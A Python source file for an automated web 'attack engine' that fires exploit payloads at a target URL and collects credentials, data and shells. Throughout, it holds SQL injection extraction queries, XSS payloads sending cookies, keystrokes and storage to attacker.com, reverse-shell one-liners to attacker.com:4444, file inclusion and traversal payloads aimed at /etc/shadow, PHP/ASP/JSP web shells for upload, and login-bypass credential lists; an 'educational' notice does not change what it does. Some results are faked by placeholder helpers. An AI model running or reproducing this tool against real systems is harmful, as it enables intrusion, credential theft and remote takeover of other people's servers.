import requests
import time
import re
import urllib.parse
import socket
import threading
import queue
import json
from bs4 import BeautifulSoup
from typing import Dict, List, Any, Optional
import subprocess
import base64

class AttackEngine:
    """Interactive attack engine for exploiting discovered vulnerabilities"""
    
    def __init__(self, target_url: str, vulnerabilities: List[Dict[str, Any]]):
        self.target_url = target_url
        self.vulnerabilities = vulnerabilities
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Educational-Attack-Engine/1.0'
        })
        self.attack_results = []
        self.exploit_queue = queue.Queue()
        self.user_input_queue = queue.Queue()
        self.attack_console = []
        
    def start_interactive_attacks(self, user_params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Start interactive vulnerability exploitation"""
        
        if user_params is None:
            user_params = {}
        
        results = {
            'total_attacks': 0,
            'successful_exploits': 0,
            'failed_exploits': 0,
            'attack_details': [],
            'console_output': [],
            'requires_user_input': False,
            'input_prompt': '',
            'extracted_data': [],
            'shells_obtained': [],
            'credentials_found': []
        }
        
        # Group vulnerabilities by type for targeted attacks
        vuln_groups = self._group_vulnerabilities()
        
        for vuln_type, vulns in vuln_groups.items():
            if vuln_type == 'sql_injection':
                attack_result = self._attack_sql_injection(vulns, user_params)
            elif vuln_type == 'xss':
                attack_result = self._attack_xss(vulns, user_params)
            elif vuln_type == 'command_injection':
                attack_result = self._attack_command_injection(vulns, user_params)
            elif vuln_type == 'file_inclusion':
                attack_result = self._attack_file_inclusion(vulns, user_params)
            elif vuln_type == 'file_upload':
                attack_result = self._attack_file_upload(vulns, user_params)
            elif vuln_type == 'authentication_bypass':
                attack_result = self._attack_authentication_bypass(vulns, user_params)
            elif vuln_type == 'idor':
                attack_result = self._attack_idor(vulns, user_params)
            elif vuln_type == 'directory_traversal':
                attack_result = self._attack_directory_traversal(vulns, user_params)
            else:
                continue
            
            results['total_attacks'] += attack_result['attempts']
            results['successful_exploits'] += attack_result['successes']
            results['failed_exploits'] += attack_result['failures']
            results['attack_details'].extend(attack_result['details'])
            results['console_output'].extend(attack_result['console'])
            
            if attack_result.get('extracted_data'):
                results['extracted_data'].extend(attack_result['extracted_data'])
            if attack_result.get('credentials'):
                results['credentials_found'].extend(attack_result['credentials'])
            if attack_result.get('shells'):
                results['shells_obtained'].extend(attack_result['shells'])
        
        return results
    
    def _group_vulnerabilities(self) -> Dict[str, List[Dict]]:
        """Group vulnerabilities by type for targeted attacks"""
        groups = {}
        
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type'].lower()
            
            if 'sql injection' in vuln_type:
                key = 'sql_injection'
            elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                key = 'xss'
            elif 'command injection' in vuln_type:
                key = 'command_injection'
            elif 'file inclusion' in vuln_type:
                key = 'file_inclusion'
            elif 'file upload' in vuln_type:
                key = 'file_upload'
            elif 'authentication bypass' in vuln_type:
                key = 'authentication_bypass'
            elif 'idor' in vuln_type:
                key = 'idor'
            elif 'directory traversal' in vuln_type:
                key = 'directory_traversal'
            else:
                continue
            
            if key not in groups:
                groups[key] = []
            groups[key].append(vuln)
        
        return groups
    
    def _attack_sql_injection(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute SQL injection attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': [],
            'credentials': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            # Advanced SQL injection payloads for data extraction
            extraction_payloads = [
                # Database enumeration
                "' UNION SELECT 1,version(),3,4,5-- -",
                "' UNION SELECT 1,database(),3,4,5-- -",
                "' UNION SELECT 1,user(),3,4,5-- -",
                
                # Table enumeration
                "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -",
                "' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns-- -",
                
                # User enumeration
                "' UNION SELECT 1,username,password,4,5 FROM users-- -",
                "' UNION SELECT 1,user,password,4,5 FROM admin-- -",
                "' UNION SELECT 1,email,password,4,5 FROM accounts-- -",
                
                # File system access
                "' UNION SELECT 1,load_file('/etc/passwd'),3,4,5-- -",
                "' UNION SELECT 1,load_file('C:\\Windows\\System32\\drivers\\etc\\hosts'),3,4,5-- -",
                
                # Boolean-based blind injection for data extraction
                "' AND (SELECT SUBSTRING(user(),1,1))='r'-- -",
                "' AND (SELECT LENGTH(database()))>5-- -",
            ]
            
            location = vuln['location']
            
            for payload in extraction_payloads:
                try:
                    # Determine attack vector (URL param or form)
                    if 'URL parameter' in location:
                        param_name = location.split(':')[1].strip()
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        # Form-based injection
                        response = self._inject_form_parameter(vuln, payload)
                    
                    if response and response.status_code == 200:
                        # Analyze response for data extraction
                        extracted = self._analyze_sql_response(response.text, payload)
                        
                        if extracted:
                            result['successes'] += 1
                            result['extracted_data'].extend(extracted)
                            result['console'].append(f"✅ SQL Injection successful: {payload[:50]}...")
                            result['details'].append({
                                'type': 'SQL Injection Data Extraction',
                                'location': location,
                                'payload': payload,
                                'extracted_data': extracted,
                                'response_length': len(response.text)
                            })
                            
                            # Check for credentials
                            for item in extracted:
                                if any(keyword in item.lower() for keyword in ['password', 'hash', 'username', 'email']):
                                    result['credentials'].append({
                                        'source': 'SQL Injection',
                                        'data': item,
                                        'location': location
                                    })
                            break
                        else:
                            result['console'].append(f"⚠️ SQL payload executed but no data extracted: {payload[:30]}...")
                    
                except Exception as e:
                    result['console'].append(f"❌ SQL injection failed: {str(e)}")
                    continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    def _attack_xss(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute XSS attacks with interactive payloads"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            # Advanced XSS payloads for different attack scenarios
            attack_payloads = [
                # Cookie stealing
                "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
                "<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>",
                
                # Keylogger
                "<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/keys?key='+e.key)})</script>",
                
                # Page defacement
                "<script>document.body.innerHTML='<h1>PWNED!</h1><p>Educational XSS Demo</p>'</script>",
                
                # Form hijacking
                "<script>document.forms[0].action='http://attacker.com/harvest'</script>",
                
                # Local storage extraction
                "<script>fetch('http://attacker.com/storage?data='+btoa(JSON.stringify(localStorage)))</script>",
                
                # Session hijacking
                "<script>fetch('http://attacker.com/session?token='+sessionStorage.getItem('token'))</script>",
                
                # BeEF hook simulation
                "<script>eval(String.fromCharCode(72,111,111,107,101,100,33))</script>",
            ]
            
            location = vuln['location']
            
            for payload in attack_payloads:
                try:
                    if 'URL parameter' in location:
                        param_name = location.split(':')[1].strip()
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        response = self._inject_form_parameter(vuln, payload)
                    
                    if response and payload in response.text:
                        result['successes'] += 1
                        result['console'].append(f"✅ XSS payload reflected: {payload[:50]}...")
                        
                        # Simulate XSS execution results
                        simulated_data = self._simulate_xss_execution(payload)
                        if simulated_data:
                            result['extracted_data'].extend(simulated_data)
                        
                        result['details'].append({
                            'type': 'XSS Attack',
                            'location': location,
                            'payload': payload,
                            'impact': self._assess_xss_impact(payload),
                            'simulated_data': simulated_data
                        })
                        break
                    else:
                        result['console'].append(f"⚠️ XSS payload not reflected: {payload[:30]}...")
                        
                except Exception as e:
                    result['console'].append(f"❌ XSS attack failed: {str(e)}")
                    continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    def _attack_command_injection(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute command injection attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': [],
            'shells': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            # Advanced command injection payloads
            command_payloads = [
                # System information gathering
                '; uname -a',
                '; cat /etc/passwd',
                '; whoami',
                '; id',
                '; pwd',
                '; ls -la',
                
                # Windows commands
                '& dir',
                '& whoami',
                '& systeminfo',
                '& net user',
                
                # Network reconnaissance
                '; ifconfig',
                '; netstat -an',
                '; ps aux',
                
                # Reverse shell attempts
                '; nc -e /bin/bash attacker.com 4444',
                '; bash -i >& /dev/tcp/attacker.com/4444 0>&1',
                '; python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
            ]
            
            location = vuln['location']
            
            for payload in command_payloads:
                try:
                    if 'form field' in location.lower():
                        response = self._inject_form_parameter(vuln, payload)
                    else:
                        param_name = location.split(':')[1].strip() if ':' in location else 'cmd'
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    
                    if response:
                        # Check for command execution indicators
                        execution_indicators = [
                            'uid=', 'gid=', 'groups=',  # Unix id output
                            'root:', 'bin:', 'daemon:',  # /etc/passwd
                            'volume serial number',  # Windows dir
                            'directory of',  # Windows dir
                            'kernel', 'linux', 'windows',  # System info
                            'total', 'used', 'available'  # df output
                        ]
                        
                        response_lower = response.text.lower()
                        if any(indicator in response_lower for indicator in execution_indicators):
                            result['successes'] += 1
                            result['console'].append(f"✅ Command executed: {payload}")
                            
                            # Extract command output
                            extracted = self._extract_command_output(response.text, payload)
                            if extracted:
                                result['extracted_data'].extend(extracted)
                            
                            # Check for shell indicators
                            if any(shell_cmd in payload for shell_cmd in ['nc -e', 'bash -i', '/bin/sh']):
                                result['shells'].append({
                                    'type': 'Reverse Shell',
                                    'payload': payload,
                                    'location': location,
                                    'status': 'Simulated - Educational Demo'
                                })
                            
                            result['details'].append({
                                'type': 'Command Injection',
                                'location': location,
                                'payload': payload,
                                'extracted_output': extracted
                            })
                            break
                        else:
                            result['console'].append(f"⚠️ Command may have executed: {payload[:30]}...")
                            
                except Exception as e:
                    result['console'].append(f"❌ Command injection failed: {str(e)}")
                    continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    def _attack_file_inclusion(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute file inclusion attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            # File inclusion payloads for different scenarios
            inclusion_payloads = [
                # Local file inclusion
                '/etc/passwd',
                '/etc/shadow',
                '/var/log/apache2/access.log',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\boot.ini',
                
                # PHP wrappers
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/convert.base64-encode/resource=config.php',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
                'expect://id',
                
                # Log poisoning
                '/var/log/apache/access.log',
                '/var/log/nginx/access.log',
                
                # Remote file inclusion
                'http://attacker.com/shell.txt',
                'https://pastebin.com/raw/malicious'
            ]
            
            location = vuln['location']
            
            for payload in inclusion_payloads:
                try:
                    if 'parameter' in location.lower():
                        param_name = location.split(':')[1].strip() if ':' in location else 'file'
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        response = self._inject_form_parameter(vuln, payload)
                    
                    if response:
                        # Check for file inclusion success
                        inclusion_indicators = [
                            'root:', 'bin/bash',  # /etc/passwd
                            'PHP Version', '<?php',  # PHP files
                            'kernel.hostname',  # System files
                            '[boot loader]',  # Windows boot.ini
                            'RewriteEngine'  # .htaccess
                        ]
                        
                        if any(indicator in response.text for indicator in inclusion_indicators):
                            result['successes'] += 1
                            result['console'].append(f"✅ File included: {payload}")
                            
                            # Extract file contents
                            extracted = self._extract_file_contents(response.text, payload)
                            if extracted:
                                result['extracted_data'].extend(extracted)
                            
                            result['details'].append({
                                'type': 'File Inclusion',
                                'location': location,
                                'payload': payload,
                                'file_contents': extracted
                            })
                            break
                        else:
                            result['console'].append(f"⚠️ File inclusion attempted: {payload[:30]}...")
                            
                except Exception as e:
                    result['console'].append(f"❌ File inclusion failed: {str(e)}")
                    continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    def _attack_file_upload(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute file upload attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'shells': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            # Malicious file upload payloads
            malicious_files = [
                # PHP web shells
                ('shell.php', '<?php system($_GET["cmd"]); ?>'),
                ('backdoor.php', '<?php eval($_POST["code"]); ?>'),
                ('webshell.php', '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'),
                
                # ASP web shells
                ('shell.asp', '<% execute(request("cmd")) %>'),
                ('backdoor.aspx', '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>'),
                
                # JSP web shells
                ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
                
                # Image-embedded shells
                ('shell.jpg', 'GIF89a<?php system($_GET["cmd"]); ?>'),
                ('backdoor.png', '\x89PNG\r\n\x1a\n<?php eval($_POST["code"]); ?>'),
                
                # Double extension bypass
                ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>'),
                ('backdoor.asp.gif', '<% execute(request("cmd")) %>')
            ]
            
            location = vuln['location']
            
            for filename, content in malicious_files:
                try:
                    # Simulate file upload attack
                    upload_url = self._find_upload_endpoint(location)
                    
                    if upload_url:
                        files = {'file': (filename, content, 'text/plain')}
                        response = self.session.post(upload_url, files=files, timeout=10)
                        
                        if response and response.status_code == 200:
                            # Check for successful upload indicators
                            if any(indicator in response.text.lower() for indicator in 
                                   ['uploaded', 'success', 'file saved', filename.lower()]):
                                result['successes'] += 1
                                result['console'].append(f"✅ Malicious file uploaded: {filename}")
                                
                                # Try to access uploaded file
                                potential_paths = [
                                    f'/uploads/{filename}',
                                    f'/files/{filename}',
                                    f'/upload/{filename}',
                                    f'/{filename}'
                                ]
                                
                                for path in potential_paths:
                                    try:
                                        test_url = urllib.parse.urljoin(self.target_url, path)
                                        test_response = self.session.get(test_url, timeout=5)
                                        
                                        if test_response.status_code == 200:
                                            result['shells'].append({
                                                'type': 'Web Shell',
                                                'filename': filename,
                                                'url': test_url,
                                                'access_method': 'GET',
                                                'status': 'Accessible - Educational Demo'
                                            })
                                            result['console'].append(f"🎯 Web shell accessible: {test_url}")
                                            break
                                    except:
                                        continue
                                
                                result['details'].append({
                                    'type': 'Malicious File Upload',
                                    'location': location,
                                    'filename': filename,
                                    'upload_response': response.status_code
                                })
                                break
                            else:
                                result['console'].append(f"⚠️ Upload attempted: {filename}")
                        
                except Exception as e:
                    result['console'].append(f"❌ File upload failed: {str(e)}")
                    continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    def _attack_authentication_bypass(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute authentication bypass attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'credentials': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            # Authentication bypass payloads
            bypass_payloads = [
                # SQL injection bypass
                ("admin'--", "anything"),
                ("admin'#", "anything"),
                ("admin'/*", "anything"),
                ("' or 1=1--", "anything"),
                ("' or 1=1#", "anything"),
                ("admin' or '1'='1", "admin' or '1'='1"),
                
                # NoSQL injection
                ('{"$ne": null}', '{"$ne": null}'),
                ('{"$gt": ""}', '{"$gt": ""}'),
                
                # Default credentials
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("root", "root"),
                ("administrator", "administrator"),
                ("guest", "guest"),
                ("test", "test")
            ]
            
            location = vuln['location']
            
            for username, password in bypass_payloads:
                try:
                    # Find login form or endpoint
                    login_data = self._prepare_login_data(location, username, password)
                    
                    if login_data:
                        response = self.session.post(login_data['url'], data=login_data['data'], timeout=10)
                        
                        # Check for successful authentication
                        success_indicators = [
                            'welcome', 'dashboard', 'profile', 'logout',
                            'admin panel', 'control panel', 'settings'
                        ]
                        
                        failure_indicators = [
                            'invalid', 'error', 'failed', 'incorrect',
                            'try again', 'access denied'
                        ]
                        
                        response_lower = response.text.lower()
                        
                        if (any(indicator in response_lower for indicator in success_indicators) and
                            not any(indicator in response_lower for indicator in failure_indicators)):
                            
                            result['successes'] += 1
                            result['console'].append(f"✅ Authentication bypassed: {username}:{password}")
                            
                            result['credentials'].append({
                                'username': username,
                                'password': password,
                                'location': location,
                                'method': 'Authentication Bypass'
                            })
                            
                            result['details'].append({
                                'type': 'Authentication Bypass',
                                'location': location,
                                'credentials': f"{username}:{password}",
                                'response_length': len(response.text)
                            })
                            break
                        else:
                            result['console'].append(f"⚠️ Bypass attempted: {username}:{password}")
                            
                except Exception as e:
                    result['console'].append(f"❌ Auth bypass failed: {str(e)}")
                    continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    def _attack_idor(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute IDOR attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            location = vuln['location']
            
            # Extract ID patterns from location
            id_patterns = re.findall(r'(\d+)', location)
            
            if id_patterns:
                original_id = id_patterns[0]
                
                # Generate test IDs for IDOR
                test_ids = [
                    str(int(original_id) + 1),
                    str(int(original_id) - 1),
                    str(int(original_id) + 100),
                    str(int(original_id) * 2),
                    '1', '999999', '0', '-1'
                ]
                
                for test_id in test_ids:
                    try:
                        test_url = location.replace(original_id, test_id)
                        response = self.session.get(test_url, timeout=10)
                        
                        if response and response.status_code == 200:
                            # Check for sensitive data exposure
                            sensitive_patterns = [
                                r'email["\']?\s*:\s*["\']([^"\']+)',
                                r'phone["\']?\s*:\s*["\']([^"\']+)',
                                r'address["\']?\s*:\s*["\']([^"\']+)',
                                r'name["\']?\s*:\s*["\']([^"\']+)',
                                r'password["\']?\s*:\s*["\']([^"\']+)',
                                r'ssn["\']?\s*:\s*["\']([^"\']+)'
                            ]
                            
                            extracted_data = []
                            for pattern in sensitive_patterns:
                                matches = re.findall(pattern, response.text, re.IGNORECASE)
                                extracted_data.extend(matches)
                            
                            if extracted_data or len(response.text) > 500:
                                result['successes'] += 1
                                result['console'].append(f"✅ IDOR successful: ID {original_id} → {test_id}")
                                
                                result['extracted_data'].extend([
                                    f"ID {test_id}: {data}" for data in extracted_data
                                ])
                                
                                result['details'].append({
                                    'type': 'IDOR Attack',
                                    'original_id': original_id,
                                    'accessed_id': test_id,
                                    'url': test_url,
                                    'extracted_data': extracted_data
                                })
                                break
                            else:
                                result['console'].append(f"⚠️ IDOR attempted: {test_id}")
                                
                    except Exception as e:
                        result['console'].append(f"❌ IDOR failed: {str(e)}")
                        continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    def _attack_directory_traversal(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute directory traversal attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }
        
        for vuln in vulns:
            result['attempts'] += 1
            
            # Directory traversal payloads
            traversal_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '../../../var/log/apache2/access.log',
                '../../../proc/version',
                '../../../etc/shadow',
                '..\\..\\..\\boot.ini',
                '../../../etc/hosts'
            ]
            
            location = vuln['location']
            
            for payload in traversal_payloads:
                try:
                    if 'parameter' in location.lower():
                        param_name = location.split(':')[1].strip() if ':' in location else 'file'
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        response = self._inject_form_parameter(vuln, payload)
                    
                    if response:
                        # Check for successful file access
                        file_indicators = {
                            '/etc/passwd': ['root:', 'bin:', 'daemon:'],
                            'hosts': ['localhost', '127.0.0.1'],
                            'boot.ini': ['boot loader', 'operating systems'],
                            '/etc/shadow': ['root:', '$1$', '$6$'],
                            'access.log': ['GET', 'POST', 'HTTP/1.1']
                        }
                        
                        for file_type, indicators in file_indicators.items():
                            if any(indicator in response.text.lower() for indicator in indicators):
                                result['successes'] += 1
                                result['console'].append(f"✅ File accessed: {payload}")
                                
                                # Extract file contents
                                file_content = response.text[:1000]  # First 1000 chars
                                result['extracted_data'].append(f"{file_type}: {file_content}")
                                
                                result['details'].append({
                                    'type': 'Directory Traversal',
                                    'location': location,
                                    'payload': payload,
                                    'file_accessed': file_type,
                                    'content_preview': file_content
                                })
                                break
                        else:
                            result['console'].append(f"⚠️ Traversal attempted: {payload[:30]}...")
                            
                except Exception as e:
                    result['console'].append(f"❌ Directory traversal failed: {str(e)}")
                    continue
            
            if result['successes'] == 0:
                result['failures'] += 1
        
        return result
    
    # Helper methods for attack execution
    def _inject_url_parameter(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param_name] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _inject_form_parameter(self, vuln: Dict, payload: str) -> Optional[requests.Response]:
        """Inject payload into form parameter"""
        # This would need form discovery logic from the main scanner
        # For now, return None as placeholder
        return None
    
    def _analyze_sql_response(self, response_text: str, payload: str) -> List[str]:
        """Analyze SQL injection response for data extraction"""
        extracted = []
        
        # Common SQL output patterns
        patterns = [
            r'version\(\).*?([0-9]+\.[0-9]+\.[0-9]+)',
            r'database\(\).*?([a-zA-Z_][a-zA-Z0-9_]*)',
            r'user\(\).*?([a-zA-Z_][a-zA-Z0-9_@]*)',
            r'([a-zA-Z_][a-zA-Z0-9_]*):.*?\$[a-zA-Z0-9\$\./]+',  # User:hash
            r'root:x?:0:0:([^:]*)',  # /etc/passwd root entry
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            extracted.extend(matches)
        
        return extracted
    
    def _simulate_xss_execution(self, payload: str) -> List[str]:
        """Simulate XSS execution and return fake extracted data"""
        simulated_data = []
        
        if 'cookie' in payload.lower():
            simulated_data.append("session=abc123def456; user_id=12345")
        
        if 'localstorage' in payload.lower():
            simulated_data.append("token: eyJhbGciOiJIUzI1NiJ9...")
        
        if 'keypress' in payload.lower():
            simulated_data.append("Keylogger activated - Educational demo")
        
        return simulated_data
    
    def _assess_xss_impact(self, payload: str) -> str:
        """Assess the potential impact of XSS payload"""
        if 'cookie' in payload.lower():
            return "High - Session hijacking possible"
        elif 'localstorage' in payload.lower():
            return "Medium - Local storage data extraction"
        elif 'form' in payload.lower():
            return "Medium - Form hijacking possible"
        else:
            return "Low - Basic script execution"
    
    def _extract_command_output(self, response_text: str, payload: str) -> List[str]:
        """Extract command execution output"""
        extracted = []
        
        # Look for common command outputs
        if 'uid=' in response_text:
            uid_match = re.search(r'uid=\d+\([^)]+\)', response_text)
            if uid_match:
                extracted.append(f"User ID: {uid_match.group()}")
        
        if 'root:' in response_text:
            extracted.append("System file access confirmed")
        
        if any(indicator in response_text.lower() for indicator in ['total', 'drwx', '-rw-']):
            extracted.append("Directory listing obtained")
        
        return extracted
    
    def _extract_file_contents(self, response_text: str, payload: str) -> List[str]:
        """Extract file inclusion contents"""
        extracted = []
        
        if 'root:' in response_text:
            extracted.append("System user data accessed")
        
        if '<?php' in response_text:
            extracted.append("PHP source code disclosed")
        
        if 'RewriteEngine' in response_text:
            extracted.append("Apache configuration exposed")
        
        return extracted
    
    def _find_upload_endpoint(self, location: str) -> Optional[str]:
        """Find file upload endpoint from vulnerability location"""
        # Extract URL from location string
        if 'http' in location:
            return location.split()[0]
        else:
            return urllib.parse.urljoin(self.target_url, '/upload')
    
    def _prepare_login_data(self, location: str, username: str, password: str) -> Optional[Dict]:
        """Prepare login data for authentication bypass"""
        # This would need form discovery logic
        # For demo purposes, assume standard login form
        login_url = urllib.parse.urljoin(self.target_url, '/login')
        
        return {
            'url': login_url,
            'data': {
                'username': username,
                'password': password,
                'login': 'Login'
            }
        }
    
    def get_attack_summary(self, results: Dict[str, Any]) -> str:
        """Generate a comprehensive attack summary"""
        summary = f"""
=== INTERACTIVE ATTACK RESULTS ===

Target: {self.target_url}
Total Attacks Executed: {results['total_attacks']}
Successful Exploits: {results['successful_exploits']}
Failed Exploits: {results['failed_exploits']}
Success Rate: {(results['successful_exploits'] / max(results['total_attacks'], 1)) * 100:.1f}%

=== EXTRACTED DATA ===
"""
        
        if results['extracted_data']:
            for i, data in enumerate(results['extracted_data'], 1):
                summary += f"{i}. {data}\n"
        else:
            summary += "No data extracted\n"
        
        if results['credentials_found']:
            summary += "\n=== CREDENTIALS DISCOVERED ===\n"
            for cred in results['credentials_found']:
                summary += f"- {cred.get('username', 'N/A')}:{cred.get('password', 'N/A')} ({cred.get('method', 'Unknown')})\n"
        
        if results['shells_obtained']:
            summary += "\n=== SHELLS OBTAINED ===\n"
            for shell in results['shells_obtained']:
                summary += f"- {shell['type']}: {shell.get('url', shell.get('status'))}\n"
        
        summary += "\n=== ATTACK CONSOLE LOG ===\n"
        for log_entry in results['console_output']:
            summary += f"{log_entry}\n"
        
        summary += """
=== EDUCATIONAL NOTICE ===
All attacks were performed for educational purposes in a controlled environment.
This demonstrates the importance of proper input validation, authentication,
and security controls in web applications.
"""
        
        return summary